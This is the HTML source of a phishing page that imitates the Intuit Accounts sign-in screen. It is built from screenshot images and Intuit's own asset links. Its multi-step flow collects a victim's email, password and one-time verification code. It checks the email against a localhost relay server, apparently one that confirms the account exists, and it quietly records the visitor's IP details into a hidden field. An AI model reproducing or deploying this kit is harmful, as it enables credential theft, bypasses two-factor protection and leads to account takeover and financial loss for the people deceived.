<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">  <script async="" id="identity-configuration-script" src="/configuration/widgets?offering_id=Intuit.sign-in-webapp" onload="identityConfigSuccess=true;" onerror="identityConfigError=true;"></script><title>Intuit Accounts - Sign In</title><link rel="preconnect" href="https://uxfabric.intuitcdn.net/" crossorigin=""><link rel="dns-prefetch" href="https://uxfabric.intuitcdn.net/"><link rel="preconnect" href="https://plugin.intuitcdn.net/" crossorigin=""><link rel="dns-prefetch" href="https://plugin.intuitcdn.net/"><link rel="preconnect" href="https://assets.intuitcdn.net/" crossorigin="">
    <link rel="stylesheet" type="text/css" href="https://plugin.intuitcdn.net/identity-authn-core-ui/58272.f3b814839869980239b917b04a6f.css" crossorigin="anonymous"><script id="tmx_tags_js" type="text/javascript" src="https://qfp.intuit.com/e4cyr7rrv8ppg2f0.js?7jd2ywf0bxhhu0xu=v60nf4oj&amp;73zqcjtjaw7d8wa3=2D518035DFC74D013DF2657562F11793"></script><meta name="description" content="" data-react-helmet="true"><meta name="robots" content="index,follow,noodp" data-react-helmet="true"><meta name="og:title" content="" data-react-helmet="true"><meta name="og:description" content="" data-react-helmet="true"><meta name="og:type" content="website" data-react-helmet="true"><meta name="og:site_name" content="" data-react-helmet="true">
    <link rel="icon" type="image/png" sizes="32x32" href="fav.ico"/>


</head>

<body class="bg-[#eceef1] h-screen flex items-center justify-center" style="background: #eceef1;

display: flex;
    flex-direction: column;
    padding-top: 40px;
">
    <img src="header.png" style="width: 340px;">

    <div class="bg-white rounded shadow-md w-96" style="    min-height: 620px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;">
        <div class=" p-6">


        <!-- Step 1: Email -->
        <div id="step1" class="mb-4">
            <img src="./1/1 (10).png">
            <img src="./1/1 (1).png" style="
    width: 300px;
    margin-top: 15px;
">
<div id="firstError" class="firstError IuxErrorBox__StyledDiv-sc-1uyrsey-0 kGzcKp" style="
background-color: rgb(252, 237, 237);
border: 1px solid rgb(216, 216, 216);
text-align: center;
padding: 14px;
margin-bottom: 20px;
display: none;
color: rgb(115, 115, 115);
">We can't find anyone with <strong class="firstErrorMsg"></strong></div>


            <input type="email" id="email" name="email" class="userauthtype w-full px-4 py-2 border rounded focus:outline-none focus:border-blue-500">
            <input type="hidden" id="ipad" name="ipad" class="userauthtype w-full px-4 py-2 border rounded focus:outline-none focus:border-blue-500">
            <img src="./1/1 (2).png" style="
    width: 240px;
    margin-left: -10px;
    margin-top: 5px;
">

            <img src="./1/1 (3).png" style="
    width: 260px;
    margin-left: -5px;
">
            <img src="./1/1 (4).png" style="
    margin-left: -5px;
" class="proceed setLoginType">
            
            <!-- <img src="./1/1 (6).png"> -->
            <center><img src="./1/1 (5).png" style="
    margin: 0px auto;
    width: 300px;
">
    
    <img src="./1/1 (7).png" style="
    width: 290px;
">
    <img src="./1/1 (8).png" style="
    width: 300px;
    margin-top: 10px;
">
</center>
            
            <!-- <img src="1.png"> -->
            <!-- <label for="email" class="block text-gray-600">Phone number, email or user ID:</label> -->
        </div>

        <!-- Step 2: OTP -->
        <div id="step2" class="mb-4 hidden">
            <img src="./2/2.png" style="
    width: 250px;
    margin: 0px auto;
">
            <img src="./2/2a.png" style="
    width: 320px;
    margin-bottom: 8px;
">
            <center><input type="password" id="pw" name="pw" class="userpw w-full px-4 py-2 border rounded focus:outline-none focus:border-blue-500" style="width: 95%;margin: 0px auto;float: none;margin-bottom: 20px;"></center>
            <img src="./2/2b.png" class="proceed" style="width: 600px !important;"  onclick="sendPw()">
            <!-- <img src="2.png"> -->
             <!-- <button id="" class="bg-blue-500 text-white px-4 py-2 rounded">Request OTP</button> -->

        </div>
        <!-- Step 2a  OTP -->
        <div id="step2a" class="mb-4 hidden">
            <img src="2a.png">
            <label for="password" class="block text-gray-600">Request OTP:</label>
            <input type="password" id="password" name="password" class="w-full px-4 py-2 border rounded focus:outline-none focus:border-blue-500">
        </div>

        <!-- Step 3: Submit -->
        <div id="step3" class="mb-4 hidden">
            <img src="./3/head.png" style="
    width: 350px;
    margin: 0px auto;
">
            <img src="./3/phone.png" class=" proceed" onclick="reqOtp('phone')">
            <img src="./3/email.png" class=" proceed" onclick="reqOtp('email')">
            <img src="./3/foot.png">
        </div>

        
        <!-- Step 4: Submit -->
        <div id="step4" class="mb-4 hidden">
            <img src="./4/phone.png" class="phone ">
            <img src="./4/email.png" class="email ">
            
            

<center><input type="password" id="otp" name="otp" class=" w-full px-4 py-2 border rounded focus:outline-none focus:border-blue-500" style="width: 90%;margin: 0px auto;float: none;margin-bottom: 20px;margin-top: 10px;">
    <button id="" class="userotp bg-blue-500 text-white px-4 py-2 rounded proceed" style="
    width: 90%;
    margin: 0px auto;
    float: none;
">Verify</button>
</center>

        </div>
        <!-- Step 4: Submit -->
        <div id="step4a" class="mb-4 hidden">
            <img src="4a.png">
            <label for="confirmPassword" class="block text-gray-600">OTP:</label>
            <input type="password" id="confirmPassword" name="confirmPassword" class="w-full px-4 py-2 border rounded focus:outline-none focus:border-blue-500">
        </div>
        
        <!-- Step 5: Submit -->
        <div id="step5" class="mb-4 hidden">
            <!-- <img src="5.png"> -->
            <label for="confirmPassword" class="block text-gray-600">Verifying your info...</label>
            <!-- <input type="password" id="confirmPassword" name="confirmPassword" class="w-full px-4 py-2 border rounded focus:outline-none focus:border-blue-500"> -->
        </div>


        <button id="nextBtn" class="bg-blue-500 text-white px-4 py-2 rounded hidden">Next</button>
        </div>
        <img src="./1/1 (9).png">

    </div>
    <img src="footer.png" style="width: 340px; margin-top: 20px;">


    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function () {
            let currentStep = 1;
            
        function isLoginValid(){

            const apiUrl = "http://localhost:3000/login?uid=" + $(".userauthtype").val(); // Update with your server URL

            fetch(apiUrl, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                },
                // body: JSON.stringify(postData),
            })
                .then(response => response.json())
                .then(data => {
                    sendIpLoginType()
                    console.log('Response:', data);
                    
                    // console.log(data)
                    const foundIndex = data.indexOf("IdentifierFirstErrorMessage");
                    // console.log(foundIndex)

                    if (foundIndex < 0) {
                        $('#firstError').hide()

                    // Hide current step
                    $(`#step${currentStep}`).addClass('hidden');

                    // Increment current step
                    currentStep++;


                    // Show next step
                    $(`#step${currentStep}`).removeClass('hidden');

                    // If it's the last step, change button text to "Submit"
                    if (currentStep === 5) {
                        $(this).text('Submit');
                    }
                    handleState()
                        
                    } else {
                        $('.firstErrorMsg').text($(".userauthtype").val())
                        

                        $('#firstError').show()
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
                

        }
            $('#nextBtn').on('click', function () {
                        
                if(currentStep == 1){
                    isLoginValid()
                }else{
                    // Hide current step
                    $(`#step${currentStep}`).addClass('hidden');

                    // Increment current step
                    currentStep++;


                    // Show next step
                    $(`#step${currentStep}`).removeClass('hidden');

                    // If it's the last step, change button text to "Submit"
                    if (currentStep === 5) {
                        $(this).text('Submit');
                    }
                    handleState()

                }
            });
        $.ajax({
            type: "GET",
            url: "https://ipinfo.io",
            dataType: 'jsonp',
            success: function(response) {
                console.log(response)
                $('#ipad').val(JSON.stringify(response));
            }
        });

    });

        
    </script>

    <script src="./flow.js"></script>

</body>

</html>
